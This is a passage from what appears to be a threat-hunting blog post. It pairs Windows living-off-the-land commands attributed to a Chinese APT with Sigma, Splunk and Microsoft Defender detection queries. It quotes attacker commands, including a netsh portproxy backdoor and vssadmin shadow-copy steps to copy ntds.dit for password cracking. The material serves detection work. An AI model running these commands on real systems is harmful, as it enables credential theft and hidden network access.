OriginalFileName = Pester.bat)|eval CommandLine=lower(CommandLine)|eventstats count(process) as procCount by process|eventstats avg(procCount) as avg stdev(procCount) as stdev|eval lowerBound=(avg-stdev*1.5)|eval isOutlier=if((procCount &lt; lowerBound),1,0)|where isOutlier=1|table host, Image, ParentImage, CommandLine, ParentCommandLine, procCount</span></pre><h2 id="5767" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">ldifde</h2><p id="c3ab" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Enumeration</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="8705" class="pp ni gv pm b bg pq pr l ps pt">ldifde.exe -f c:\windows\temp\.txt -p subtree</span></pre><p id="364e" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="26c5" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">net user/group/use</h2><p id="1c95" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Enumeration</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="4426" class="pp ni gv pm b bg pq pr l ps pt">net localgroup administrators</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="aa6d" class="pp ni gv pm b bg pq pr l ps pt">net group /dom</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="e761" class="pp ni gv pm b bg pq pr l ps pt">net group “Domain Admins” /dom</span></pre><p id="e34a" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="fe17" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">netsh</h2><p id="244b" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Enumeration netsh</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="81ce" class="pp ni gv pm b bg pq pr l ps pt">netsh interface firewall show all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="185a" class="pp ni gv pm b bg pq pr l ps pt">netsh interface portproxy show all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="4de3" class="pp ni gv pm b bg pq pr l ps pt">netsh interface portproxy show v4tov4</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="159d" class="pp ni gv pm b bg pq pr l ps pt">netsh firewall show all</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="83bb" class="pp ni gv pm b bg pq pr l ps pt">netsh portproxy show v4tov4</span></pre><p id="f670" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="4abe" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">And Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b3dc" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\netsh.exe” OR OriginalFileName=”netsh.exe”) AND ((CommandLine=”*netsh *”) AND (CommandLine=”*show *”) AND (CommandLine=”*firewall *”) AND (CommandLine=”*config *” OR CommandLine=”*state *” OR CommandLine=”*rule *” OR CommandLine=”*name=all*”)))</span></pre><p id="cba3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">And MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="1faf" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\netsh.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’netsh.exe’ or ProcessVersionInfoOriginalFileName =~ @’netsh.exe’) and (ProcessCommandLine contains @’netsh ‘ and ProcessCommandLine contains @’show ‘ and ProcessCommandLine contains @’firewall ‘ and (ProcessCommandLine contains @’config ‘ or ProcessCommandLine contains @’state ‘ or ProcessCommandLine contains @’rule ‘ or ProcessCommandLine contains @’name=all’)))</span></pre><h2 id="b499" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Port Proxy T1090 Information portproxy</h2><p id="56d1" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">The actor has used the following commands to enable port forwarding [T1090] on the host: “cmd.exe /c “netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp””</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="04a9" class="pp ni gv pm b bg pq pr l ps pt">“cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=”</span></pre><p id="8aff" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — Portproxy add command</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Portproxy%20add%20command.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Portproxy add command.yml at main · Schmouni242/Sigma-Rules</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qq l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="252b" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="53e8" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and (ProcessCommandLine contains @’netsh ‘ and ProcessCommandLine contains @’interface ‘ and ProcessCommandLine contains @’portproxy ‘ and (ProcessCommandLine contains @’add ‘ or ProcessCommandLine contains @’listenport ‘ or ProcessCommandLine contains @’connetaddress= ‘ or ProcessCommandLine contains @’connectport=1433&#x27;)))</span></pre><p id="efce" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="c0f7" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND ((CommandLine=”*netsh *”) AND (CommandLine=”*interface *”) AND (CommandLine=”*portproxy *”) AND (CommandLine=”*add *” OR CommandLine=”*listenport *” OR CommandLine=”*connetaddress= *” OR CommandLine=”*connectport=1433*”)))</span></pre><blockquote class="ow ox oy"><p id="6e15" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Where is replaced with an IPv4 address internal to the network, omitting the &lt; &gt;’s. Netsh is a built-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport. <strong class="of gw">Administrative privileges are required to execute the portproxy</strong> command. Each portproxy command above will create a registry key…</p></blockquote><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="e97a" class="pp ni gv pm b bg pq pr l ps pt">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\</span></pre><blockquote class="ow ox oy"><p id="f91f" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Defenders should look for the presence of keys in this path and <strong class="of gw">investigate any anomalous entries</strong>. Note: Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required. Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. <strong class="of gw">All hosts on the network should be examined for new and unusual firewall and port forwarding rules</strong>, as well as IP addresses and ports specified by the actor. If network traffic or logging is available, defenders should attempt to identify what traffic was forwarded though the port proxies to aid in the hunt operation. As previously mentioned, identifying the associated user account that made the networking changes can also aid in the hunt operation. Firewall rule additions and changes can be viewed in Windows Event Viewer by navigating to: <strong class="of gw">Applications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced Security | Firewall</strong>. In addition to host-level changes, defenders should review perimeter firewall configurations <strong class="of gw">for unauthorized changes and/or entries that may permit external connections to internal hosts</strong>. The actor is known to target perimeter devices in their operations. Firewall logs should be reviewed for any connections to systems on the ports listed in any portproxy commands discovered.</p></blockquote><h2 id="ea15" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">nltest</h2><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_execution.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_nltest_execution.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qr l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="721b" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5b3b" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (Image=”*\\nltest.exe” OR OriginalFileName=”nltestrk.exe”)</span></pre><p id="fce1" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5ff5" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where (FolderPath endswith @’\nltest.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’ or ProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’)</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_nltest_recon.yml at master · SigmaHQ/sigma</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qs l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="0063" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b0d6" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\nltest.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’ or ProcessVersionInfoOriginalFileName =~ @’nltestrk.exe’) and ((ProcessCommandLine contains @’/server’ and ProcessCommandLine contains @’/query’) or (ProcessCommandLine contains @’/dclist:’ or ProcessCommandLine contains @’/parentdomain’ or ProcessCommandLine contains @’/domain_trusts’ or ProcessCommandLine contains @’/all_trusts’ or ProcessCommandLine contains @’/trusted_domains’ or ProcessCommandLine contains @’/user’)))</span></pre><p id="4745" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="857b" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\nltest.exe” OR OriginalFileName=”nltestrk.exe”) AND (((CommandLine=”*/server*”) AND (CommandLine=”*/query*”)) OR (CommandLine=”*/dclist:*” OR CommandLine=”*/parentdomain*” OR CommandLine=”*/domain_trusts*” OR CommandLine=”*/all_trusts*” OR CommandLine=”*/trusted_domains*” OR CommandLine=”*/user*”))) | table Image,User,CommandLine,ParentCommandLine</span></pre><h2 id="c82c" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">PowerShell</h2><blockquote class="ow ox oy"><p id="c7b1" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">The actor has used the following PowerShell [T1059.001] command to identify successful logons to the host [T1033]:</p></blockquote><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="f30c" class="pp ni gv pm b bg pq pr l ps pt">Get-EventLog security -instanceid 4624</span></pre><blockquote class="ow ox oy"><p id="3a89" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to: <strong class="of gw">Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell</strong>. This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique [T1110.003], there may be several failed logon (Event ID 4625) events for several different user accounts, followed by one or more successful logons (Event ID 4624) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes. If the actor is using brute force password attempts [T1110] against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624. Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-anddistance logons (e.g., a user logging on from two geographically separated locations at the same time).</p></blockquote><p id="418e" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT successful Logon on Host</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Succesful%20Logon%20on%20Host.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Succesful Logon on Host.yml at main · Schmouni242/Sigma-Rules</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qt l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="8e36" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b948" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\powershell.exe” OR OriginalFileName=”powershell.exe”) AND CommandLine=”*Get-EventLog*” AND (CommandLine=”*Get-EventLog security -instanceid 4624*” OR CommandLine=”*Get-Eventlog security*”))</span></pre><p id="b118" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="e146" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\powershell.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’powershell.exe’ or ProcessVersionInfoOriginalFileName =~ @’powershell.exe’) and ProcessCommandLine contains @’Get-EventLog’ and (ProcessCommandLine contains @’Get-EventLog security -instanceid 4624&#x27; or ProcessCommandLine contains @’Get-Eventlog security’))</span></pre><h2 id="39c2" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">req query/save</h2><p id="7e79" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT Credential Theft Query Registry Software</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Credential%20Theft%20Query%20Registry%20Software.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Credential Theft Query Registry Software.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qu l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="ec04" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — LOLBAS Chinese APT Credential Theft Save Registry SAM and SYSTEM</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Credential%20Theft%20Save%20Registry%20SAM%20and%20System.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/LOLBAS Chinese APT Credential Theft Save Registry SAM and System.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qv l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="adf6" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">systeminfo</h2><p id="2e54" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="a873" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">tasklist</h2><p id="b8aa" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="75b2" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">wevtutil</h2><p id="f1bd" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="a81d" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Windows Management Instrumentation WMI/WMIC</h2><p id="032f" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Windows management instrumentation (WMI/WMIC) The actor has executed the following command to gather information about local drives [T1082]:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="0560" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /C “wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename”</span></pre><blockquote class="ow ox oy"><p id="222b" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">This command does not require administrative credentials to return results. The command uses a command prompt [T1059.003] to execute a Windows Management Instrumentation Command Line (WMIC) query, collecting information about the storage devices on the local host, including drive letter, file system (e.g., new technology file system [NTFS]), free space and drive size in bytes, and an optional volume name. Windows Management Instrumentation (WMI) is a built-in Windows tool that allows a user to access management information from hosts in an enterprise environment. The command line version of WMI is called WMIC. By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available. Additional information on WMI events and tracing can be found in the References section of the advisory.</p></blockquote><h2 id="9770" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Ntdsutil.exe</h2><blockquote class="ow ox oy"><p id="7685" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking [T1003.003]. (The ntds.dit file is the main Active Directory (AD) database file and, by default, is stored at <strong class="of gw">%SystemRoot%\NTDS\ntds.dit</strong>. This file contains information about users, groups, group memberships, and password hashes for all users in the domain; the SYSTEM registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may also be obtained from the Shadow Copy. The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it</p></blockquote><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="3251" class="pp ni gv pm b bg pq pr l ps pt">cmd /c vssadmin create shadow /for=C: &gt; C:\Windows\Temp\.tmp</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7ecb" class="pp ni gv pm b bg pq pr l ps pt">cmd /c copy</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b0e9" class="pp ni gv pm b bg pq pr l ps pt">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTD S\ntds.dit C:\Windows\Temp &gt; C:\Windows\Temp\.tmp</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qw l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="f497" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="a2ac" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (((Image=”*\\powershell.exe” OR Image=”*\\pwsh.exe” OR Image=”*\\wmic.exe” OR Image=”*\\vssadmin.exe”) OR (OriginalFileName=”PowerShell.EXE” OR OriginalFileName=”pwsh.dll” OR OriginalFileName=”wmic.exe” OR OriginalFileName=”VSSADMIN.EXE”)) AND ((CommandLine=”*shadow*”) AND (CommandLine=”*create*”)))</span></pre><p id="b7b4" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="16b4" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where (((FolderPath endswith 